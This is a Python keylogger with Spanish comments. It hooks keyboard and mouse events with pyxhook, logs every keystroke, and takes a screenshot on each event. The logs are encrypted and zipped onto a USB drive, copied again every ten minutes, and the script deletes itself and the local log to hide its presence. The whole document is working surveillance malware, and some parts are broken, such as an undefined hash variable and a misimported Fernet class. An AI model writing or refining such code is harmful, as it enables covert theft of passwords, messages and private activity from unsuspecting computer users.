import pyxhook
import os
import shutil
import hashlib
import zipfile
import pyautogui
import datetime
import fernet
import time

log_file = 'registro.txt'  # nombre de archivo para guardar el registro
usb_path = 'F:\\'  # ruta del USB donde se almacenará la información
keylogger_size = os.path.getsize(__file__)

def OnKeyPress(event):
    now = datetime.datetime.now()
    with open(log_file, 'a') as f:
        f.write('{} [KEYPRESS]\t{}\t{}\n'.format(now, event.Key, event.Ascii))

    # Capturar imagen de la pantalla con sello de tiempo
    screenshot_path = os.path.join(usb_path, 'screenshot_{}.png'.format(now.strftime('%Y%m%d_%H%M%S')))
    pyautogui.screenshot(screenshot_path)

def OnMouseMove(event):
    now = datetime.datetime.now()
    with open(log_file, 'a') as f:
        f.write('{} [MOUSEMOVE]\t{}\t{}\n'.format(now, event.Position[0], event.Position[1]))

    # Capturar imagen de la pantalla con sello de tiempo
    screenshot_path = os.path.join(usb_path, 'screenshot_{}.png'.format(now.strftime('%Y%m%d_%H%M%S')))
    pyautogui.screenshot(screenshot_path)

def encrypt_file(key, input_file, output_file):
    with open(input_file, 'rb') as f:
        data = f.read()
    fernet = Fernet(key)
    encrypted_data = fernet.encrypt(data)
    with open(output_file, 'wb') as f:
        f.write(encrypted_data)

def copy_log_to_usb():
    while True:
        time.sleep(600)  # Copiar cada 10 minutos (600 segundos)
        shutil.copy(log_file, usb_path)
        shutil.copy(encrypted_log_file, usb_path)

# Configurar el keylogger
hook_manager = pyxhook.HookManager()
hook_manager.KeyDown = OnKeyPress
hook_manager.MouseMovement = OnMouseMove
hook_manager.HookKeyboard()
hook_manager.HookMouse()
hook_manager.start()

# Esperar a que se inserte el USB
while not os.path.exists(usb_path):
    pass

# Verificar espacio en la memoria USB
usb_stats = shutil.disk_usage(usb_path)
if usb_stats.free > keylogger_size:
    # Generar clave para encriptar y desencriptar archivos
    key = Fernet.generate_key()

    # Encriptar el archivo de registro
    encrypted_log_file = os.path.join(usb_path, 'registro_encrypted.txt')
    encrypt_file(key, log_file, encrypted_log_file)

    # Crear archivo ZIP comprimido con el archivo de registro encriptado y el hash
    with zipfile.ZipFile(os.path.join(usb_path, 'registro_encrypted.zip'), 'w', zipfile.ZIP_DEFLATED) as zipf:
        zipf.write(encrypted_log_file)
        zipf.writestr('hash.txt', file_hash)

    # Eliminar archivo de registro local, el keylogger y el archivo encriptado
    os.remove(log_file)
    os.remove(encrypted_log_file)
    os.remove(__file__)

    # Iniciar el proceso de copiar el archivo de registro cada cierto tiempo
    copy_log_to_usb()
else:
    print("Espacio insuficiente en el USB.")
